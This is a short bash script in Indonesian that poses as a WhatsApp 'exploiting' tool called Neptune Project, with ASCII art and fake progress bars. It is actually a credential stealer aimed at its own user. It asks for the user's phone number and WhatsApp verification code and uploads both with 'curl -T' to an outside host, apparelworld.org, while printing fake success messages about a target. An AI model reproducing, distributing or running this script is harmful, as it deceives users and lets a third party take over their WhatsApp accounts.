#!/bin/bash
clear
nep(){
echo " ~         ~            ~     w   W   w "
sleep 0.03
echo "                    ~          \  |  /       ~ "
sleep 0.03
echo "        ~        ~        ~     \.|./    "
sleep 0.03
echo "                                  | "
sleep 0.03
echo "                       ~       ~  |           ~ "
sleep 0.03
echo "       o        ~   .:.:.:.       | ~ "
sleep 0.03
echo "  ~                 wwWWWww      //   ~ "
sleep 0.03
echo "            ((c     ))---((     //|        ~ "
sleep 0.03
echo "   o       /\/\((  (( 6 6 ))   // |  ~ "
sleep 0.03
echo "          (d d  ((  )))^(((   //  | "
sleep 0.03
echo "     o    /   / c((-(((-)))-.//   |     ~ "
sleep 0.03
echo "         /===/  ) (( )))(( ._/    |~ "
sleep 0.03
echo "  ~     /o o/  / c((( (()) |      |  ~          ~ "
sleep 0.03
echo "     ~  .~.^  / c (((  ))  |      |           ~ "
sleep 0.03
echo "             /c  c(((  (   |  ~   |      ~ "
sleep 0.03
echo "      ~     /  c  (((  .   |      |   ~           ~ "
sleep 0.03
echo "           / c   c ((^^^^^^ \   ~ | ~        ~       "
sleep 0.03
echo "          |c  c c  c((^^^ ^^^ \   | "
sleep 0.03
echo "  ~        \ c   c   c(^^^^^^^^ \ |    ~       "
sleep 0.03
echo "       ~     \ c   c  c; \^^^^^./ |             ~ "
sleep 0.03
echo "               \c c  c  ;/^^^^^/  |  ~ "
sleep 0.03
echo "   ~        ~    \ c  c /^^^^/  ~ |       ~ "
sleep 0.03
echo "         ~         ;c   |^^/      o "
sleep 0.03
echo "             .-.     c c//^\\         ~ "
sleep 0.03
echo "     ~      ( @  . c  -///^\\\  ~             ~ "
sleep 0.03
echo "             \ -  c__/|/     \|    "
sleep 0.03
echo "      ~       ----        ~   '          ~ "
sleep 0.03
echo " ~          ~          ~           ~      "
sleep 0.2
echo "==================================================="
sleep 0.2
echo "==             Neptune Project                   =="
sleep 0.5
echo "==================================================="
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
clear
echo "Loading..."
echo
load
clear
nep
echo "Selamat datang kak, Siapa nick kaka?" #tulisan keluar
read nick #membaca yang ditulis
clear
echo "Tunggu..."
echo
load
clear
nep
echo "Neptune Project Adalah Tools Untuk "
echo "Melakukan Exploiting Whatsapp "
echo
echo "Selamat Datang $nick :)Jones"
echo
read -p "Masukan Nomer Kamu (+62)=> " nomer;
read -p "Masukan Nomer Target (+62) => " target;
sleep 2
load
clear
echo "[+] Syncing Target...";
sleep 1
echo "Login=> $nomer";
sleep 0.5
echo "Target=> $target";
sleep 0.5
echo "[+] Exploiting...";
echo "Nomer => $nomer" >> kontol.html;
curl -T kontol.html http://apparelworld.org/
clear
sleep 5;
clear
echo "Mohon Tunggu..."
load
clear
echo "[+] Done.";
echo "Tunggu 5-10 Menit Untuk Mendapatkan Code.";
read -p "Verify Code => " code;
sleep 2
echo "[+] Connecting to whatsapp.com...";
echo "Login => $nomer";
sleep 0.5
echo "Code => $code";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Sending Exploit...";
echo "Code => $code" >> kontol.html;
curl -T kontol.html http://apparelworld.org/
sleep 5
clear
load
clear
echo "[+] Success Exploited!";
exit;
